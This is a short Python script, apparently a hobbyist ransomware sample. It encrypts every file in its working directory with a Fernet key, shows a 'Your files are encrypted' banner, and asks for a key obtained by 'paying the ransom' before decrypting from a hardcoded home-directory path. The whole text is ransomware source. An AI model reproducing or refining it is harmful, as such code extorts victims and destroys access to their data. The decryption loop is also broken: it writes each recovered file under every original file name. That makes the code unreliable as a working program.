from cryptography.fernet import Fernet
key = Fernet.generate_key()
clear_key = bytes.decode(key)
print (clear_key)
import base64
import os
from time import sleep

dir_list = os.listdir()
#print (dir_list)
msg = ("\n      +-+-+-+-+|Y|o|u|r| |f|i|l|e|s| |a|r|e| |e|n|c|r|y|p|t|e|d| +-+-+-+-+    \n")
print (msg)

try:
        for i in dir_list:
                with open(i, 'rb') as f:
                        data = f.read()
                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)
                with open("f/Encrypted_{}".format(i), "wb") as f:
                        f.write(encrypted)
                print ("[+] Encrypted file {}".format(i))
                sleep(2)
#this version will only encrypt files not dir so, if theres dir in the path, it will igonore
except:
        pass

dcrpt = input('Enter the key that you get after paying the ransom: \n')


en_dir = os.listdir('f')        #f is the dir that contains encrypted files
print (en_dir)
for j in en_dir:
        with open("/home/arise/Music/R/f/{}".format(j), 'rb') as f:
                data = f.read()

        fernet = Fernet(dcrpt)
        encrypted = fernet.decrypt(data)
        for k in dir_list:
                with open("r3coV3r3d_{}".format(k), 'wb') as f:
                        f.write(encrypted)
                        print ("[-] Decrypting file {}".format(k))
                        sleep(3)



